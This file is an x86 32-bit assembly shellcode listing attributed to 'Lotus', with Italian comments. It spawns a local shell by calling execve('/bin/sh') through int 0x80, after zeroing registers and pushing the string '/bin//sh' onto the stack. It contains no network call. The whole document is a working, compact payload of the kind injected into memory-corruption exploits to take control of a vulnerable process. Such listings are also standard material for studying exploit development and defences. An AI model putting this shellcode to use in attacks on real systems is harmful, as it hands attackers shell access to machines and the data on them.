;#	Shellcode by Lotus	#;
;#	execve("/bin/sh")	#;
;#	32 bit arch		    #;

BITS 32

;int execve(const char *pathname, char *const argv[], char *const envp[])

push BYTE 11        
pop eax
cdq                 ;azzera edx dal bit del segno di eax
xor ecx, ecx
push edx    		;push per il terminatore null
push 0x68732f2f		;push "//sh"
push 0x6e69622f		;push "/bin"
mov ebx, esp		;salva l'indirizzo di "/bin//sh"
int 0x80		

